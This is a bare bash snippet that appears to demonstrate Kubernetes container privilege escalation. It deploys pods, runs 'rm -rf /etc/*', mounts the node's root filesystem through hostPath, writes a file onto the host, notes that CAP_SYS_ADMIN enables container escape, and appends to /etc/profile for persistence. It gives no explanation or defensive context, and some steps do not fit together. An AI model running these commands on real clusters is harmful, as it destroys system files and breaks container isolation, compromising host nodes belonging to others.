```bash
kubectl apply -f -<<EOF
apiVersion: v1
kind: Pod
metadata:
  name: root-pod
spec:
  containers:
  - name: app
    image: alpine
    command: ["sh", "-c", "sleep 3600"]
EOF

kubectl exec -it root-pod -- sh
id

rm -rf /etc/*

kubectl apply -f -<<EOF
apiVersion: v1
kind: Pod
metadata:
  name: root-hostpath
spec:
  containers:
  - name: app
    image: ubuntu
    imagePullPolicy: Always
    command: ["sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
      type: Directory
EOF

kubectl exec -it root-hostpath -- sh
id
ls /host

touch /host/tmp/owned-by-container

capsh --print
#cap_sys_admin, cap_net_admin, ...
# CAP_SYS_ADMIN alone allows:
#   mounting filesystems
#   kernel interaction
#   container escape techniques

echo 'echo hacked-from-busybox' >> /etc/profile
exit
kubectl exec -it root-hostpath -- sh
```
